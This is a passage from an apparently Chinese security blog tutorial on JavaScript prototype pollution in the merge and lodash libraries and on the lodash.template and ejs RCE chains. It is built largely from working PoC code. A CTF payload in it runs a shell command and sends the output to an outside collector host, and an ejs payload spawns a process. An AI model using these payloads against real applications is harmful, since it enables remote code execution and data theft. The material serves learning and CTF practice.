2&#125;&#125;</code>，那么对b的键名进行遍历的时候就会忽略<code>__proto__</code>不会把它看作键名，因为<code>__proto__</code>被看作是原型了，所以遍历后的键名是a、b。</p><p>因此为了使<code>__proto__</code>被解析为键名，我们需要配合JSON.parse。</p><h3 id="merge-recursiveMerge"><a href="#merge-recursiveMerge" class="headerlink" title="merge.recursiveMerge"></a>merge.recursiveMerge</h3><p>漏洞编号CVE-2020-28499，poc如下，需要引入<a href="mailto:&#x6d;&#101;&#x72;&#103;&#x65;&#x40;&#x32;&#x2e;&#49;&#x2e;&#x30;">&#x6d;&#101;&#x72;&#103;&#x65;&#x40;&#x32;&#x2e;&#49;&#x2e;&#x30;</a>(ver&lt;2.1.1)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> merge = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;merge&#x27;</span>);<br><br><span class="hljs-keyword">const</span> payload2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;x&quot;: &#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#125;&#x27;</span>);<br><br><span class="hljs-keyword">let</span> obj1 = &#123;<span class="hljs-attr">x</span>: &#123;<span class="hljs-attr">y</span>:<span class="hljs-number">1</span>&#125;&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before : &quot;</span> + obj1.<span class="hljs-property">polluted</span>);<br>merge.<span class="hljs-title function_">recursive</span>(obj1, payload2);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After : &quot;</span> + obj1.<span class="hljs-property">polluted</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//Before : undefined</span><br><span class="hljs-comment">//After : yes</span><br><span class="hljs-comment">//After : yes</span><br></code></pre></td></tr></table></figure><p>调试过程中发现调用链是<code>recursive -&gt; _merge -&gt; _recursiveMerge</code>，而<code>_recursiveMerge</code>中存在递归合并:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_recursiveMerge</span>(<span class="hljs-params">base, extend</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isPlainObject</span>(base))<br>        <span class="hljs-keyword">return</span> extend;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> extend)<br>        base[key] = (<span class="hljs-title function_">isPlainObject</span>(base[key]) &amp;&amp; <span class="hljs-title function_">isPlainObject</span>(extend[key])) ?<br>            <span class="hljs-title function_">_recursiveMerge</span>(base[key], extend[key]) :<br>            extend[key];<br>    <span class="hljs-keyword">return</span> base;<br>&#125;<br></code></pre></td></tr></table></figure><p>值得注意的是<code>_merge</code>方法有一处过滤，过滤了一些关键词</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span> &#124;&#124; key === <span class="hljs-string">&#x27;constructor&#x27;</span> &#124;&#124; key === <span class="hljs-string">&#x27;prototype&#x27;</span>)<br>   <span class="hljs-keyword">continue</span>;<br></code></pre></td></tr></table></figure><p>但是检查的范围仅仅是key，我们再嵌套一层数组即可，也就是payload：<code>&#123;&quot;x&quot;: &#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#125;</code></p><h2 id="0x03-Lodash中的污染"><a href="#0x03-Lodash中的污染" class="headerlink" title="0x03 Lodash中的污染"></a>0x03 Lodash中的污染</h2><h3 id="lodash-defaultsDeep"><a href="#lodash-defaultsDeep" class="headerlink" title="lodash.defaultsDeep"></a>lodash.defaultsDeep</h3><p>漏洞编号CVE-2019-10744，需要引入<a href="mailto:&#x6c;&#111;&#100;&#x61;&#115;&#104;&#x40;&#52;&#x2e;&#49;&#55;&#x2e;&#x31;&#x31;">&#x6c;&#111;&#100;&#x61;&#115;&#104;&#x40;&#52;&#x2e;&#49;&#55;&#x2e;&#x31;&#x31;</a>(ver&lt;4.17.12)，poc如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mergeFn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>).<span class="hljs-property">defaultsDeep</span>;<br><span class="hljs-keyword">const</span> payload = <span class="hljs-string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">mergeFn</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(payload));<br>    <span class="hljs-keyword">if</span> ((&#123;&#125;)[<span class="hljs-string">`a0`</span>] === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Vulnerable to Prototype Pollution via <span class="hljs-subst">$&#123;payload&#125;</span>`</span>);<br>    &#125;<br>  &#125;<br><br><span class="hljs-title function_">check</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">whoami</span>);<br><span class="hljs-comment">//打印Vulnerable</span><br></code></pre></td></tr></table></figure><h3 id="lodash-merge"><a href="#lodash-merge" class="headerlink" title="lodash.merge"></a>lodash.merge</h3><p>这里使用ver 4.17.4才好使。</p><p>与前面提到的merge相似，poc如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;</span>;<br><br><span class="hljs-keyword">var</span> a = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before polluted: &quot;</span> + a.<span class="hljs-property">polluted</span>);<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(payload));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After polluted: &quot;</span> + a.<span class="hljs-property">polluted</span>);<br></code></pre></td></tr></table></figure><h3 id="lodash-mergeWith"><a href="#lodash-mergeWith" class="headerlink" title="lodash.mergeWith"></a>lodash.mergeWith</h3><p>漏洞编号CVE-2018-16487，相比于merge增加了一个参数<code>customizer</code>，作用是控制合并方式，若<code>customizer</code>未定义则依然由merge替代，因此事实上它对我们的利用方式没有影响，poc不变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;</span>;<br><br><span class="hljs-keyword">var</span> a = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before polluted: &quot;</span> + a.<span class="hljs-property">polluted</span>);<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(payload));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After polluted: &quot;</span> + a.<span class="hljs-property">polluted</span>);<br></code></pre></td></tr></table></figure><h3 id="lodash-set"><a href="#lodash-set" class="headerlink" title="lodash.set"></a>lodash.set</h3><p>修改指定path(对象属性)的value(值)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">set</span>(object, path, value)<br><span class="hljs-comment">//object (Object): 要修改的对象。</span><br><span class="hljs-comment">//path (Array&#124;string): 要设置的对象路径。</span><br><span class="hljs-comment">//value (*): 要设置的值。</span><br></code></pre></td></tr></table></figure><p>注意此方法会直接改变Object。例如给多层嵌套的属性c赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> object = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br>lodash.<span class="hljs-title function_">set</span>(object, <span class="hljs-string">&#x27;a[0].b.c&#x27;</span>, <span class="hljs-number">4</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">a</span>[<span class="hljs-number">0</span>].<span class="hljs-property">b</span>.<span class="hljs-property">c</span>);<br><span class="hljs-comment">//打印</span><br><span class="hljs-comment">//4</span><br></code></pre></td></tr></table></figure><p>跟一下源码，首先set调了baseSet</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">set</span>(<span class="hljs-params">object, path, value</span>) &#123;<br>  <span class="hljs-keyword">return</span> object == <span class="hljs-literal">null</span> ? object : <span class="hljs-title function_">baseSet</span>(object, path, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是castPath，stringToPath，最后也没有任何过滤，poc</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">var</span> object_1 = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><span class="hljs-keyword">var</span> object_2 = &#123;&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object_1.<span class="hljs-property">whoami</span>);<br><span class="hljs-comment">//lodash.set(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br>lodash.<span class="hljs-title function_">set</span>(object_2, <span class="hljs-string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="hljs-string">&#x27;Vulnerable&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object_1.<span class="hljs-property">whoami</span>);<br><span class="hljs-comment">//打印</span><br><span class="hljs-comment">//undefined</span><br><span class="hljs-comment">//Vulnerable</span><br></code></pre></td></tr></table></figure><h3 id="lodash-setWith"><a href="#lodash-setWith" class="headerlink" title="lodash.setWith"></a>lodash.setWith</h3><p>与mergeWith类似，相比于set方法多一个customizer参数控制设置对象值的方式，不传入也不影响我们的利用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">var</span> object_1 = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><span class="hljs-keyword">var</span> object_2 = &#123;&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object_1.<span class="hljs-property">whoami</span>);<br><span class="hljs-comment">//lodash.setWith(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br>lodash.<span class="hljs-title function_">setWith</span>(object_2, <span class="hljs-string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="hljs-string">&#x27;Vulnerable&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object_1.<span class="hljs-property">whoami</span>);<br></code></pre></td></tr></table></figure><h3 id="lodash-zipObjectDeep"><a href="#lodash-zipObjectDeep" class="headerlink" title="lodash.zipObjectDeep"></a>lodash.zipObjectDeep</h3><p>漏洞编号CVE-2020-8203，影响版本ver&lt;4.17.16</p><p>zipObjectDeep(props, values) ，props为属性路径，values是值，两者都为数组。</p><p>源码里给出了注释</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">_.<span class="hljs-title function_">zipObjectDeep</span>([<span class="hljs-string">&#x27;a.b[0].c&#x27;</span>, <span class="hljs-string">&#x27;a.b[1].d&#x27;</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]);  <br><span class="hljs-comment">// =&gt; &#123; &#x27;a&#x27;: &#123; &#x27;b&#x27;: [&#123; &#x27;c&#x27;: 1 &#125;, &#123; &#x27;d&#x27;: 2 &#125;] &#125; &#125;</span><br></code></pre></td></tr></table></figure><p>将两个对象合并成了一个数组，并完成赋值，左边数组的键值与右边数组的值一一对应。</p><p>那么如果我们传入单元素数组<code>__proto__</code>，就可以污染原型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br>_.<span class="hljs-title function_">zipObjectDeep</span>([<span class="hljs-string">&#x27;__proto__.z&#x27;</span>],[<span class="hljs-number">666</span>])<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(z)<br><span class="hljs-comment">//打印</span><br><span class="hljs-comment">//666</span><br></code></pre></td></tr></table></figure><h2 id="0x04-Lodash-RCE"><a href="#0x04-Lodash-RCE" class="headerlink" title="0x04 Lodash RCE"></a>0x04 Lodash RCE</h2><p>注意lodash ver&lt;&#x3D;4.17.4。</p><h3 id="lodash-template-RCE"><a href="#lodash-template-RCE" class="headerlink" title="lodash.template   RCE"></a>lodash.template   RCE</h3><p>Lodash.template 是 Lodash 中的一个简单的模板引擎用于输出渲染，而template方法中的<code>sourceURL</code>存在拼接，关键代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> result = <span class="hljs-title function_">attempt</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source)<br>    .<span class="hljs-title function_">apply</span>(<span class="hljs-literal">undefined</span>, importsValues);<br>&#125;);<br></code></pre></td></tr></table></figure><p>如果我们能够污染<code>sourceURL</code>属性，将其赋值为<code>xxx\r\n &lt;code&gt; \r\n</code>就可实现命令注入，因此关键点在于原型链的污染。</p><p>注意Function中没有require方法，但我们可以使用<code>global.process.mainModule.constructor._load</code>来代替。</p><p>这里提供一道例题**[Code-Breaking 2018] Thejs**，源码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/static&#x27;</span>, express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;static&#x27;</span>))<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;thejs.session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomize</span>(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span><br>&#125;))<br>app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) &#123; <span class="hljs-comment">// define the template engine</span><br>    fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err))<br>        <span class="hljs-keyword">let</span> compiled = lodash.<span class="hljs-title function_">template</span>(content)<br>        <span class="hljs-keyword">let</span> rendered = <span class="hljs-title function_">compiled</span>(&#123;...options&#125;)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, rendered)<br>    &#125;)<br>&#125;)<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> &#124;&#124; &#123;<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []&#125;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        data = lodash.<span class="hljs-title function_">merge</span>(data, req.<span class="hljs-property">body</span>)<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> = data<br>    &#125;<br><br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<br>        <span class="hljs-attr">language</span>: data.<span class="hljs-property">language</span>,<br>        <span class="hljs-attr">category</span>: data.<span class="hljs-property">category</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening on port 3000!`</span>))<br></code></pre></td></tr></table></figure><p>可以看到同时使用了<code>Lodash.template</code>与<code>Lodash.merge</code>，merge方法在lodash漏洞版本内，因此我们就可以直接去污染</p><p><code>sourceURL</code>实现RCE，以下是payload。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//执行并外带，设置type为json</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx\r\nvar require = global.require &#124;&#124; global.process.mainModule.constructor._load;var result = require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString();var req = require(&#x27;http&#x27;).request(`http://xxxxx.ceye.io/$&#123;result&#125;`);req.end();\r\n&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="lodash-amp-ejs-RCE"><a href="#lodash-amp-ejs-RCE" class="headerlink" title="lodash &amp; ejs RCE"></a>lodash &amp; ejs RCE</h3><p>漏洞编号CVE-2022-29078，Nodejs 的 ejs 模板引擎存在一个利用原型污染进行 RCE 的一个漏洞。但要实现 RCE，首先需要有原型链污染，这里我们暂且使用 lodash.merge 方法中的原型链污染漏洞。</p><p>漏洞成因其实和lodash.template是一样的，都是变量存在拼接，同时配合merge污染。漏洞关键代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//ejs.js compile方法</span><br><span class="hljs-comment">//....</span><br>    <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">outputFunctionName</span>) &#123;<br>        prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.<span class="hljs-property">outputFunctionName</span> + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      &#125;<br><span class="hljs-comment">//....</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">source</span> = prepended + <span class="hljs-variable language_">this</span>.<span class="hljs-property">source</span> + appended;<br><span class="hljs-comment">//.... </span><br><span class="hljs-comment">//source -&gt; src</span><br><span class="hljs-comment">//....</span><br>fn = <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>(opts.<span class="hljs-property">localsName</span> + <span class="hljs-string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src); <span class="hljs-comment">//此处执行</span><br><br></code></pre></td></tr></table></figure><p>很明显污染<code>outputFunctionName</code>即可。</p><p>测试代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> ejs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-comment">//设置模板的位置与种类</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, __dirname);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views engine&#x27;</span>,<span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-comment">//对原型进行污染</span><br><span class="hljs-keyword">var</span> malicious_payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;</span>;<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(malicious_payload));<br><br><span class="hljs-comment">//进行渲染</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-property">render</span> (<span class="hljs-string">&quot;index.ejs&quot;</span>,&#123;<br>        <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;success&#x27;</span><br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">//设置http</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)<br>&#125;);<br></code></pre></td></tr></table></figure><p>运行后访问触发render函数渲染，即可RCE。</p><h3 id="lodash-amp-jade-RCE"><a href="#lodash-amp-jade-RCE" class="headerlink" title="lodash 